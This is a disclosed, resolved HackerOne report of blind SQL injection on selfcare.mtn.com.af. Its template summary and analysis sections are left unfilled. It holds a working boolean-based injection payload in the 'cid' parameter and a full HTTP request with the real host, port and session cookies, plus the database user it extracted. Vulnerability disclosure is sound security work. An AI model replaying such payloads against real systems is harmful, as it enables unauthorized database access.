---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '925007'
original_report_id: '925007'
title: blind sql on [selfcare.mtn.com.af]
weakness: SQL Injection
team_handle: mtn_group
created_at: '2020-07-16T07:47:21.766Z'
disclosed_at: '2021-09-09T11:39:31.178Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
asset_identifier: mtn.com.af
asset_type: URL
max_severity: critical
tags:
- hackerone
- sql-injection
---

# blind sql on [selfcare.mtn.com.af]

## Metadata

- HackerOne Report ID: 925007
- Weakness: SQL Injection
- Program: mtn_group
- Disclosed At: 2021-09-09T11:39:31.178Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
[add summary of the vulnerability]

## Steps To Reproduce:
[add details for how we can reproduce the issue]

get cid = sql 

SQL query - SELECT user FROM dual
CON_APP_MTNA

HTTP Request

`GET /selfcare/HomePageDisplay?cid=26%20AND%203*2*1=6%20AND%20498=498&location=MTNA HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: https://selfcare.mtn.com.af:8083/selfcare/appmanager/selfcare/login
Cookie: JSESSIONID=QZyyfPfpfWGsWJZP9fXGGPxJQpnpP5Lz9BgDvTr5HpZkkQGqvLL2!1814712056;TrackedProfileId=YW5vbnltb3VzXzkzNDEyOEtYK04zb2V3SDlkcmFRdCtHNWwydVE9PQ==
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: selfcare.mtn.com.af:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
Connection: Keep-alive`

## Impact

sql

Proof of Exploit
SQL query - SELECT user FROM dual
CON_APP_MTNA

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
